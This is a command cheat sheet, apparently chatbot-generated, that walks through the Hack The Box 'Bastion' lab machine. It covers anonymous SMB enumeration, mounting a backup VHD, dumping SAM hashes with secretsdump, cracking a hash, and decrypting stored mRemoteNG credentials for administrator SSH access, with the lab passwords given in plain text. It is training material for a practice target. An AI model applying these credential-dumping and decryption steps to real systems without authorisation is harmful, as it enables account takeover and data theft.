## 🔧 **Tools Used**
- `nmap`
- `smbmap`
- `smbclient`
- `mount` (with CIFS)
- `guestmount` (from `libguestfs-tools`)
- `secretsdump.py` (Impacket)
- [CrackStation](https://crackstation.net/)
- `ssh`
- `mRemoteNG`
- `java -jar decipher_mremoteng.jar`
- Custom Python decryption script
- PowerShell
- `type` (Windows)

---

## 💻 **Commands Used (Chronologically)**

### 📡 Recon
```bash
nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.134
nmap -sC -sV -p 22,135,139,445 -oA scans/nmap-tcpscripts 10.10.10.134
```

### 📁 [SMB](SMB.md) Enumeration
```bash
smbmap -H 10.10.10.134
smbmap -H 10.10.10.134 -u df
smbclient -N -L //10.10.10.134
smbclient -N //10.10.10.134/backups
```

### 🔗 Mount SMB Share
```bash
mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
find /mnt/ -type f
```

### 🧩 Mount VHD
```bash
apt install libguestfs-tools
guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
ls /mnt2/
```

### 🔓 Dump Credentials
```bash
cd /mnt2/Windows/System32/config
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### 🔐 Crack Password
```bash
# Use https://crackstation.net/ on hash 26112010952d963c8dc4217daec986d9
```

### 💻 [SSH](SSH.md) as User
```bash
ssh L4mpje@10.10.10.134
# password: bureaulampje
type C:\Users\L4mpje\Desktop\user.txt
```

### 📂 Inspect Installed Software
```powershell
cd "C:\Program Files (x86)\"
```

### 🔎 mRemoteNG Profile
```powershell
cd C:\Users\L4mpje\AppData\Roaming\mRemoteNG
type confCons.xml
```

### 🔓 Decrypt Password via Java
```bash
# (Download jar from: https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/decipher_mremoteng.jar)
java -jar decipher_mremoteng.jar V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
```

### 🔓 Decrypt via Python Script
```bash
./mRemoteNG-decrypt.py confCons.xml
```

### 🔐 SSH as Administrator
```bash
ssh administrator@10.10.10.134
# password: thXLHM96BeKL0ER2
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🔗 Link to Writeup

📖 [0xdf’s Full Bastion Writeup](https://0xdf.gitlab.io/2019/09/07/htb-bastion.html)

---

Let me know if you'd like this converted into a markdown cheat sheet or printable version 📋